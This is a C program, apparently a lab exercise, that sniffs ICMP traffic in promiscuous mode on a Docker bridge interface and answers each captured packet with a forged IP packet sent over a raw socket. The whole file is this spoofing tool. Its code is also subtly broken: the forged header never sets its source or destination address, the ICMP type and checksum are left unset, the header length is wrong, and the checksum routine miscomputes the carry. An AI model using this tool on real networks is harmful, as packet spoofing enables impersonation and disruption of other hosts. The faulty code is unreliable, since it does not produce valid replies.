#include <pcap.h> // for using the pcap library calls
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h> //for string methods
#include <sys/socket.h> //for socket methods
#include <stdlib.h>
#define ETHERNET_LENGTH_VAL 6

struct icmpheader {
  unsigned char icmp_type; 
  unsigned char icmp_code; 
  unsigned short int icmp_chksum; 
  unsigned short int icmp_id;   
  unsigned short int icmp_seq;    
};

struct ethheader {
  u_char  ether_dhost[ETHERNET_LENGTH_VAL]; 
  u_char  ether_shost[ETHERNET_LENGTH_VAL]; 
  u_short ether_type;             
};

struct ipheader {
  unsigned char iph_ihl:4; 
  unsigned char iph_ver:4;
  unsigned char iph_tos; 
  unsigned short int iph_len; 
  unsigned short int iph_ident; 
  unsigned short int iph_flag:3; 
  unsigned short int iph_offset:13; 
  unsigned char      iph_ttl;
  unsigned char      iph_protocol; 
  unsigned short int iph_chksum; 
  struct  in_addr    iph_sourceip; 
  struct  in_addr    iph_destip;   
};

unsigned short evaluate_checksum_value (unsigned short *buffer_string, int leng){
   unsigned short *str_var = buffer_string;
   unsigned short temporary_var=0;
   int var = leng;
   int summation_var=0;
   while (var >1){
       summation_var = summation_var + *str_var++;
       var = var-2;
   }
   if (var == 1) {
        *(unsigned char *)(&temporary_var) = *(unsigned char *)str_var;
        summation_var = summation_var + temporary_var;
   }
   int lower = summation_var>>16;
   int upper = summation_var & 0xffff;
   summation_var = lower + upper;
   summation_var = summation_var + lower;
   unsigned short negation = (unsigned short) ~summation_var;   
   return negation;
}

void transfer_raw_packets_with_sockets(struct ipheader* ip_struct){
    struct sockaddr_in dest_info;
    int enable_var = 1;
    int socket_var = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //creating the socket
    if(socket_var<0){
        printf("An error related to socket has happened !");
	exit(EXIT_FAILURE);
    }
    int size = sizeof(enable_var);
    setsockopt(socket_var, IPPROTO_IP, IP_HDRINCL,&enable_var,size);
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip_struct->iph_destip;
    int size_destination = sizeof(dest_info);
    if(sendto(socket_var, ip_struct, ntohs(ip_struct->iph_len), 0, //sending the raw packet
           (struct sockaddr *)&dest_info, size_destination)<0){
                   printf("An error happened while sending the raw packet");
                   exit(EXIT_FAILURE);
    } else {
        printf("Successful Spoofing !");
    }
    close(socket_var);
}


void obtain_packet_information(u_char *args, const struct pcap_pkthdr *header,
                              const u_char *packet){

  struct ethheader* eth_struct_val = (struct ethheader *)packet; //creating an eth header instance
  if (ntohs(eth_struct_val->ether_type) == 0x0800) { // Here, 0x0800 is the type of the IP.
    struct ipheader * ip_struct_val = (struct ipheader *)
                           (packet + sizeof(struct ethheader));
      int size_ip = ip_struct_val->iph_ihl*4; //defining the size of the ip. Doing the byte order conversion.
      printf("The Current Source IP Address is: %s\n", inet_ntoa(ip_struct_val->iph_sourceip)); //source ip
      printf("The Current Destination IP Address is: %s\n", inet_ntoa(ip_struct_val->iph_destip)); //destination ip
      unsigned char protocol_type = ip_struct_val->iph_protocol;
      if(protocol_type==IPPROTO_UDP){ //UDP case
	      printf("The Protocol Type is UDP !! \n"); //printing a related message for the UDP case
      }
      else if(protocol_type==IPPROTO_TCP){ //TCP case
              printf("The Protocol Type is TCP !! \n"); //printing a related message for the TCP case
      }
      else if(protocol_type==IPPROTO_ICMP){ //ICMP case
              printf("The Protocol Type is ICMP!! \n"); //printing a related message for the ICMP case
	      struct icmpheader* icmp_data_val=(struct icmpheader*)((unsigned char *)packet + sizeof(struct ethheader)+size_ip);
	      int buf_capacity=2000;
	      char buf_str[buf_capacity];
	      int size_sum = (sizeof (struct ipheader)) + (sizeof (struct ethheader)) + (sizeof (struct icmpheader));
	      int length_val_of_data = header->len - size_sum;
	      char* str_data_val= packet+sizeof(struct icmpheader)+sizeof(struct ethheader)+sizeof(struct ipheader);
              memcpy(buf_str+sizeof(struct icmpheader)+sizeof(struct ipheader), str_data_val, length_val_of_data);
              struct ipheader *ip_val = (struct ipheader *) buf_str;
          
          //Filling the ipheader instance which is named as ip_val
          ip_val->iph_ttl = 35;
          ip_val->iph_ihl = 6;
	      ip_val->iph_protocol = IPPROTO_ICMP;
	      ip_val->iph_ver= 4;
          
          
         ip_val->iph_chksum = evaluate_checksum_value((unsigned short *)ip_val,sizeof(struct ipheader)); //checksum calculation for ip header instance
	      int len_sum = length_val_of_data + sizeof(struct ipheader) + sizeof(struct icmpheader);
	      ip_val->iph_len = htons(len_sum);
          transfer_raw_packets_with_sockets(ip_val); //sending the raw packets
      } else {
           if(protocol_type==' '){ //Null Protocol Case
	       printf("Invalid Protocol !!: \n");
           } else { //Other Protocol Types
	       printf("The Protocol Type is different from UDP TCP or ICMP !!: \n");
           } 
      } 

     }
  }
int main() {
    char errbuf_str[PCAP_ERRBUF_SIZE];
    struct bpf_program fp_val;
    char filter_expression[] = "proto ICMP"; //specifying the filter expression
    bpf_u_int32 net;
    char *iface_name="br-90b7eb23ec7c"; //specifying the interface to the interface having "br-" prefix.
    int promiscious_mode_on=1;
    pcap_t *handle_string_var= pcap_open_live(iface_name, BUFSIZ, promiscious_mode_on, 1000, errbuf_str); //accessing to the device
    if(handle_string_var==NULL){ //error case while accessing the device
         printf("An error happened while opening a live session !!! \n");
	 exit(EXIT_FAILURE);
    }

    pcap_compile(handle_string_var, &fp_val, filter_expression, 0, net); //compilation process
    pcap_setfilter(handle_string_var, &fp_val); //setting the filter
    int infinite_loop=-1; //for making the infinite loop mode active
    pcap_loop(handle_string_var, infinite_loop, obtain_packet_information, NULL); // for going through all of the packets
    pcap_close(handle_string_var);
    return 0;
}

